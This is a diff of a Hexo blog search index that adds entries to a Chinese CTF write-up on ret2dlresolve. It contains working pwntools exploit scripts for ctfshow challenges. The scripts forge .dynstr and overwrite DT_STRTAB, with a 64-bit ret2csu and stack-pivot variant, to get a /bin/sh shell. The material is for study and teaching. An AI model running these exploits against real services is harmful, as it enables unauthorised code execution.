@@ -1,6 +1,24 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Hello World</title>
+    <url>/2025/03/04/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>ret2dlresolve超详解</title>
     <url>/2025/03/04/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/</url>
     <content><![CDATA[<h2 id="ret2dlresovle攻击原理"><a href="#ret2dlresovle攻击原理" class="headerlink" title="ret2dlresovle攻击原理"></a>ret2dlresovle攻击原理</h2><p>ret2dlresovle攻击的本质就是在于程序在动态链接时篡改相关结构体，让程序解析到错误的函数，进而达成攻击</p>
@@ -129,24 +147,12 @@
 <p>因为是No-Relro所以.dynamic可写，那么我们直接将.dynamic中的DT_STRTAB的值给改成我们恶意伪造在bss段上的.dynstr节(将任意函数名替换成system)的地址就可以直接进行攻击</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = remote(&#x27;pwn.challenge.ctf.show&#x27;,28268)</span><br><span class="line">#sh = process(&#x27;./pwn1&#x27;)</span><br><span class="line">elf = ELF(&#x27;./pwn1&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#gdb.attach(sh, &#x27;b *0x8048513\nc&#x27;)</span><br><span class="line">pop_3 = 0x08048629</span><br><span class="line">read_plt_next = 0x08048376</span><br><span class="line">bss_addr = 0x080498E0</span><br><span class="line"></span><br><span class="line">DT_STRTAB_addr = 0x08049808</span><br><span class="line">dynstr = elf.get_section_by_name(&#x27;.dynstr&#x27;).data()</span><br><span class="line">fake_dynstr = dynstr.replace(b&#x27;read&#x27;,b&#x27;system&#x27;)</span><br><span class="line"></span><br><span class="line">payload = cyclic(0x6C + 0x4) + p32(elf.sym[&#x27;read&#x27;]) + p32(pop_3) + p32(0) + p32(DT_STRTAB_addr) + p32(4)</span><br><span class="line">payload += p32(elf.sym[&#x27;read&#x27;]) + p32(pop_3) + p32(0) + p32(bss_addr + 0x100) + p32(len(b&#x27;/bin/sh\x00&#x27;))</span><br><span class="line">payload += p32(elf.sym[&#x27;read&#x27;]) + p32(pop_3) + p32(0) + p32(bss_addr) + p32(len(fake_dynstr))</span><br><span class="line">payload += p32(read_plt_next) + p32(0xdeadbeef) + p32(bss_addr + 0x100)</span><br><span class="line">sh.sendlineafter(&#x27;Welcome to CTFshowPWN!\n&#x27;,payload)</span><br><span class="line">sh.send(p32(bss_addr))</span><br><span class="line">sh.send(b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">sh.send(fake_dynstr)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
-]]></content>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/2025/03/04/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+<h3 id="32位下No-Relro-1"><a href="#32位下No-Relro-1" class="headerlink" title="32位下No-Relro"></a>32位下No-Relro</h3><p>以ctfshow Pwn84为例，由于是64位所以需要寄存器传参，但是由于没有合适的gadget，这里采用ret2csu</p>
+<p>而且只能溢出0x30个字节，显然不够用，所以还要先进行一次Stack Pivot</p>
+<img src="/2025/03/04/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/image-20250306103950624.png" class="" title="image-20250306103950624">
 
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./pwn2&#x27;)</span><br><span class="line">sh = process(&#x27;./pwn2&#x27;)</span><br><span class="line">#gdb.attach(sh, &#x27;b *0x40063B\nc&#x27;)</span><br><span class="line">#sh = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28161)</span><br><span class="line">DT_STRTAB_addr = 0x600990</span><br><span class="line">read_plt_next = 0x400516</span><br><span class="line">pop_rdi = 0x400773</span><br><span class="line">payload = cyclic(0x70 + 0x8)</span><br><span class="line">csu_front_addr = 0x400750</span><br><span class="line">csu_end_addr = 0x40076A</span><br><span class="line">dynstr = elf.get_section_by_name(&#x27;.dynstr&#x27;).data()</span><br><span class="line">fake_dynstr = dynstr.replace(b&#x27;read&#x27;,b&#x27;system&#x27;)</span><br><span class="line">pivot_addr = elf.bss(0x100) - 0x8</span><br><span class="line">pop_rbp_ret = 0x400588</span><br><span class="line">leave_ret = 0x40063c</span><br><span class="line">ret_addr = 0x4004c6</span><br><span class="line">def ret2csu(fuction, rdi, rsi, rdx):</span><br><span class="line">    payload = p64(csu_end_addr)</span><br><span class="line">    payload += p64(0)</span><br><span class="line">    payload += p64(1)</span><br><span class="line">    payload += p64(fuction)</span><br><span class="line">    payload += p64(rdi)</span><br><span class="line">    payload += p64(rsi)</span><br><span class="line">    payload += p64(rdx)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    return payload</span><br><span class="line">def ret2csu_end():</span><br><span class="line">    return cyclic(0x38)</span><br><span class="line"></span><br><span class="line">payload = cyclic(0x70 + 0x8)</span><br><span class="line">payload += ret2csu(elf.got[&#x27;read&#x27;],0,elf.bss(0x100),0x150)</span><br><span class="line">payload += ret2csu_end()</span><br><span class="line">payload += p64(ret_addr) + p64(0x40063E)</span><br><span class="line">sh.sendafter(&#x27;Welcome to CTFshowPWN!\n&#x27;,payload)</span><br><span class="line"></span><br><span class="line">payload = ret2csu(elf.got[&#x27;read&#x27;],0,elf.bss(0x300),len(fake_dynstr))</span><br><span class="line">payload += ret2csu(elf.got[&#x27;read&#x27;],0,DT_STRTAB_addr,0x8)</span><br><span class="line">payload += ret2csu(elf.got[&#x27;read&#x27;],0,elf.bss(0x250),len(b&#x27;/bin/sh\x00&#x27;))</span><br><span class="line">payload += ret2csu_end()</span><br><span class="line">payload += p64(ret_addr) + p64(pop_rdi) + p64(elf.bss(0x250)) + p64(read_plt_next) + p64(0xdeadbeef)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">payload = cyclic(0x70) + p64(pivot_addr) + p64(leave_ret)</span><br><span class="line">sh.sendafter(&#x27;Welcome to CTFshowPWN!\n&#x27;,payload)</span><br><span class="line"></span><br><span class="line">sh.send(fake_dynstr)</span><br><span class="line">sh.send(p64(elf.bss(0x300)))</span><br><span class="line">sh.send(b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 ]]></content>
   </entry>
 </search>
